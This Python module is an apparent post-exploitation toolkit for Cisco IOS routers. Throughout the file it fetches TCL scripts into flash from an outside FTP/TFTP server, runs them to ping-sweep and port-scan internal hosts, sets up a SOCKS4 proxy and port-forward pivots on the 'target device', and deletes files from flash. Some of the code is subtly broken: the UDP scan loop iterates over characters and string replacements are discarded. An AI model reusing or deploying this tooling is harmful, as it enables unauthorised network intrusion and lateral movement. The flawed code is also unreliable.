import ipaddress
import asyncio
import netdev


class CiscoIOSHandler:
    def __init__(self, device: dict):
        self.device = device
        self.open_ports = []

    @staticmethod
    async def get_version(ios: netdev.vendors.CiscoIOS) -> str:
        """Class coroutine to retrieve version information from device"""
        output = await ios.send_command('sh ver')
        return output if output else ""

    @staticmethod
    async def get_running_configuration(ios: netdev.vendors.CiscoIOS) -> str:
        """Class coroutine to retrieve running configuration from device"""
        output = await ios.send_command('sh run')
        return output if output else ""

    @staticmethod
    async def netmask_to_cidr(netmask: str) -> str:
        """Class coroutine to translate netmask to CIDR notation"""
        return ipaddress.IPv4Network(f'0.0.0.0/{netmask}').prefixlen

    @staticmethod
    async def get_subnet_chunks(size: int, network: ipaddress.IPv4Network) -> list:
        """Class coroutine to break a large subnet into smaller chunks for processing"""
        return list(network.subnets(prefixlen_diff=size))

    @staticmethod
    async def check_flash_file(filename: str, ios: netdev.vendors.CiscoIOS):
        """Class coroutine to check if a filename exists within flash memory on device"""
        output = await ios.send_command(f'dir flash: | inc {filename}')
        if '%' in output:
            return False
        if filename in output:
            return True
        return False

    @staticmethod
    async def check_enable_mode(ios: netdev.vendors.CiscoIOS):
        """Class coroutine to check if the device prompt is elevated to admin"""
        return await ios.check_enable_mode()

    @staticmethod
    async def check_tcl_mode(ios: netdev.vendors.CiscoIOS):
        """Class coroutine to check if the TCL scripting prompt is supported on device"""
        output = await ios.send_command('tclsh')
        if '%' in output:
            return False
        await ios.send_command('tclquit')
        return True

    @staticmethod
    async def del_flash(filename: str, ios: netdev.vendors.CiscoIOS):
        """Class coroutine to delete a file in flash memory if it exists"""
        output = await ios.send_command(f'del {filename}', pattern=']?')
        output += await ios.send_command(f'', pattern=']')
        output += await ios.send_command(f'')
        if '%' in output:
            return False
        return True

    async def get_interfaces(self, ios: netdev.vendors.CiscoIOS):
        """Class coroutine to retrieve all interface names from device"""
        ifaces = []
        output = await self.get_running_configuration(ios)
        output.replace('\r\n', '\n')
        [ifaces.append(x.split(' ')[1]) for x in output.split('\n') if x.strip().startswith('interface')]
        return ifaces

    async def get_networks(self, ios: netdev.vendors.CiscoIOS) -> list:
        """Class coroutine to retrieve all the networks on the device"""
        networks = []
        output = await self.get_running_configuration(ios)
        output.replace('\r\n', '\n')
        for x in output.split('\n'):
            if x.strip().startswith('ip address'):
                net = x.strip().split(' ')
                if len(net) != 4:
                    continue
                network = f'{net[2]}/{await self.netmask_to_cidr(net[3])}'
                if ipaddress.ip_address(self.device['host']) in ipaddress.ip_network(network, False):
                    continue
                networks.append(network)
        return networks

    @staticmethod
    async def ping_scan_network(network: str, ios: netdev.vendors.CiscoIOS) -> list:
        """Class coroutine to start a ICMP ping sweep on the provided network range"""
        live_hosts = []
        output = await ios.send_command(f'tclsh flash:iosmap.tcl -sP {network}')
        for line in output.split('\n'):
            if 'up' in line:
                live_hosts.append(line.split()[1])
        return live_hosts

    @staticmethod
    async def port_scan_tcp(ports: str, internal_host: str, ios: netdev.vendors.CiscoIOS) -> list:
        """Class coroutine to initiate a TCP port scan on the provided internal host ip"""
        open_ports = []
        output = await ios.send_command(f'tclsh flash:iosmap.tcl -sT {internal_host} -p{ports}', strip_command=False)
        for line in output.split('\n'):
            port = line.split(' ')[0]
            if "open" in line:
                open_ports.append((internal_host, port))
        return open_ports

    @staticmethod
    async def port_scan_udp(ports: str, internal_host: str, ios: netdev.vendors.CiscoIOS) -> list:
        """Class coroutine to initiate a UDP port scan on the provided internal host ip"""
        open_ports = []
        output = await ios.send_command(f'tclsh flash:iosmap.tcl -sU {internal_host} -p{ports}')
        for line in output:
            port = line.split(' ')[0]
            if "open" in line:
                open_ports.append((internal_host, port))
        return open_ports

    @staticmethod
    async def file_download_tftp(server: str, filename: str, ios: netdev.vendors.CiscoIOS) -> bool:
        """Class coroutine to download a file via trivial ftp server"""
        output = await ios.send_command(f'copy tftp://{server}/{filename} flash:', pattern=']?')
        output += await ios.send_command('')
        await asyncio.sleep(2)
        if 'timed out' in output.lower():
            return False
        elif 'bytes copied' in output.lower():
            return True
        return False

    @staticmethod
    async def file_download_ftp(server: str, filename: str, ios: netdev.vendors.CiscoIOS) -> bool:
        """Class coroutine to download a file via Secure Copy server"""
        output = await ios.send_command(f'copy ftp://anonymous:anonymous@{server}/{filename} flash:', pattern=']?')
        output += await ios.send_command('', pattern=']')
        output += await ios.send_command('', pattern=']')
        output += await ios.send_command('')
        if '%' in output:
            return False
        if 'bytes copied' in output.lower():
            return True
        return False

    @staticmethod
    async def setup_proxy(port: str, ios: netdev.vendors.CiscoIOS) -> bool:
        """Class coroutine to setup a SOCKS4 proxy on the target device"""
        output = await ios.send_command(f'tclsh flash:/iosproxy.tcl -D {port}')
        if '%' in output:
            return False
        return True

    @staticmethod
    async def setup_pivot(port: str, internal_host: str, internal_port: str, ios: netdev.vendors.CiscoIOS):
        """Class coroutine to setup a pivot point within the target device"""
        output = await ios.send_command(f'tclsh flash:/iosproxy.tcl -L {port}:{internal_host}:{internal_port}')
